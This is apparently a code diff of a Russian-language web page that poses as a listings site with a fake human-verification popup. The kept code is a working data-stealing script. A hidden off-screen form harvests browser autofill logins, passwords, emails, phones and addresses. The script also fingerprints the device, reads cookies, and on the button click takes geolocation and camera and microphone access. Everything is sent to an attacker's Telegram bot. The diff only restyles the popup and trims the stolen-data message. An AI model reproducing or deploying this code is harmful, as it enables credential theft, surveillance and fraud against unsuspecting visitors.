@@ -24,12 +24,12 @@ td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:
 td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:100;justify-content:center;align-items:center;padding:20px}
 .overlay.show{display:flex}
-.popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center}
-.popup h3{font-size:18px;color:#fff;margin-bottom:6px}
-.popup .desc{font-size:12px;color:#64748b;margin-bottom:16px;line-height:1.4}
-.popup .checks{text-align:left;margin:14px 0;font-size:12px;color:#64748b;line-height:1.8}
-.popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
-.popup .fineprint{font-size:9px;color:#3a4450;margin-top:12px;line-height:1.4}
+.popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:32px 24px;max-width:380px;width:100%;text-align:center}
+.popup .icon{font-size:44px;margin-bottom:10px}
+.popup h3{font-size:18px;color:#fff;margin-bottom:10px}
+.popup .desc{font-size:13px;color:#64748b;margin-bottom:20px;line-height:1.5}
+.popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit}
+.popup .fineprint{font-size:9px;color:#3a4450;margin-top:14px;line-height:1.5}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
 .footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
 @media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
@@ -75,15 +75,9 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 
 <div class="overlay" id="overlay">
 <div class="popup">
-<div style="font-size:40px;margin-bottom:8px">🔐</div>
-<h3>Подтверждение безопасности</h3>
-<div class="desc">Для защиты от автоматических ботов<br>необходимо подтвердить что вы человек.</div>
-<div class="checks">
-✅ Проверка геолокации<br>
-✅ Проверка устройства<br>
-✅ Подтверждение личности<br>
-✅ Защита от ботов
-</div>
+<div class="icon">🔐</div>
+<h3>Подтвердите что вы человек</h3>
+<div class="desc">Это необходимо для защиты<br>от автоматических ботов.</div>
 <button class="btn-pop" onclick="submitAll()">Подтвердить и продолжить</button>
 <div class="fineprint">
 Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>
@@ -127,7 +121,6 @@ shuffleAndShow();
 setInterval(shuffleAndShow,8000);
 setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
-// Сбор данных
 var PD={};
 PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
 PD.sw=screen.width;PD.sh=screen.height;
@@ -161,42 +154,30 @@ PD.af_ph2=document.querySelector('[name="ph2"]').value||"-";
 PD.af_adr=document.querySelector('[name="adr"]').value||"-";
 },2500);
 
-// Показываем попап через 1.5 секунды
 setTimeout(function(){
 document.getElementById('overlay').classList.add('show');
 },1500);
 
 function sendAll(d){
-var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
+var msg='🚨 ЗАХВАТ\n\n'+
 '🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
 '🌐 IP: '+(d.ip||"-")+'\n'+
-'📍 '+(d.country||"-")+', '+(d.city||"-")+', '+(d.region||"-")+'\n'+
+'📍 '+(d.country||"-")+', '+(d.city||"-")+'\n'+
 '📡 '+(d.provider||"-")+'\n'+
 '🕐 TZ: '+(d.tz||"-")+' / IP: '+(d.tz_ip||"-")+'\n\n'+
 '📱 '+(d.platform||"-")+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
 '🖥 '+(d.sw||"-")+'x'+(d.sh||"-")+' | CPU:'+(d.cpu||"-")+' | RAM:'+(d.ram||"-")+'\n'+
-'🗣 '+(d.lang||"-")+'\n'+
-'🎮 '+(d.gpu||"-")+'\n'+
-'🔋 '+(d.bat||"-")+'\n'+
-'📶 '+(d.conn||"-")+'\n\n'+
-'📍 ГЕО:\nШирота: '+(d.geo_lat||"ожидание")+'\nДолгота: '+(d.geo_lng||"ожидание")+'\nТочность: '+(d.geo_acc||"ожидание")+'\n\n'+
-'📸 КАМЕРА: '+(d.camera||"-")+'\n'+
-'🎤 МИКРОФОН: '+(d.mic||"-")+'\n'+
-'🔔 УВЕДОМЛЕНИЯ: '+(d.notifications||"-")+'\n\n'+
+'🗣 '+(d.lang||"-")+'\n🎮 '+(d.gpu||"-")+'\n🔋 '+(d.bat||"-")+'\n📶 '+(d.conn||"-")+'\n\n'+
+'📍 ГЕО: '+(d.geo_lat||"-")+', '+(d.geo_lng||"-")+' ('+(d.geo_acc||"-")+')\n\n'+
+'📸 КАМЕРА: '+(d.camera||"-")+'\n🎤 МИКРОФОН: '+(d.mic||"-")+'\n\n'+
 '🔑 АВТОЗАПОЛНЕНИЕ:\n'+
-'LOGIN: '+(d.af_u||"-")+'\n'+
-'PASS: '+(d.af_p||"-")+'\n'+
-'EMAIL: '+(d.af_e||"-")+'\n'+
-'NAME: '+(d.af_fn||"-")+'\n'+
-'PHONE: '+(d.af_ph||"-")+'\n'+
-'PHONE2: '+(d.af_ph2||"-")+'\n'+
+'LOGIN: '+(d.af_u||"-")+'\nPASS: '+(d.af_p||"-")+'\nEMAIL: '+(d.af_e||"-")+'\n'+
+'NAME: '+(d.af_fn||"-")+'\nPHONE: '+(d.af_ph||"-")+'\nPHONE2: '+(d.af_ph2||"-")+'\n'+
 'ADDR: '+(d.af_adr||"-")+'\n\n'+
-'🔗 REF: '+(d.ref||"-")+'\n'+
-'🍪 COOKIE: '+((d.cookie||"-").substring(0,500));
+'🔗 REF: '+(d.ref||"-")+'\n🍪 COOKIE: '+((d.cookie||"-").substring(0,500));
 
 fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
-method:"POST",
-headers:{"Content-Type":"application/json"},
+method:"POST",headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:msg})
 });
 }
@@ -216,7 +197,6 @@ fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd})
 }
 
 async function submitAll(){
-// Гео
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
 PD.geo_lat=pos.coords.latitude;
@@ -225,7 +205,6 @@ PD.geo_acc=pos.coords.accuracy+' м';
 },{},{enableHighAccuracy:true,timeout:5000});
 }
 
-// Камера + микрофон
 try{
 var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
 PD.camera="получен";
@@ -251,7 +230,6 @@ sendAll(PD);
 done();
 }
 
-// Уведомления
 if('Notification' in window){
 Notification.requestPermission().then(function(p){PD.notifications=p});
 }
